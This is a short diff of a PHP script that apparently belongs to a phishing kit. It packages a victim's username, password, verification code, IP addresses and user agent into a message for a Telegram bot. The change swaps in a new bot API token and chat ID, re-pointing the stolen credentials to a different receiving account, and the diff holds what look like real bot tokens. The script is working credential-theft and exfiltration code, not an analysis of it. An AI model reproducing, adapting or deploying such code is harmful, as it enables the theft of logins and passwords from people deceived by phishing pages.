@@ -8,10 +8,10 @@ if( isset( $_POST['ipts1'] ) && isset( $_POST['ipts2']) && isset( $_POST['ipts3'
     
     @$message = "GT\n\n".'User-agent: '.$_SERVER['HTTP_USER_AGENT']."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"."IP2: ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'COD: '.$_SESSION['COD']."\n".'Usuario: '.$_SESSION['USER']."\n".'Pass: '.$_SESSION['PASS'];
 
-    $apiToken = "5603437920:AAFVgSu0qu79oq4bN5zsY310O2X30jS-3_c";
+    $apiToken = "5761388760:AAHwURtMYD45Ru5rHHEGfTSwaeQuT8zFMec";
 
     $data = [
-        'chat_id' => '5490168678',
+        'chat_id' => '5474544277',
         'text' => $message
     ];
     
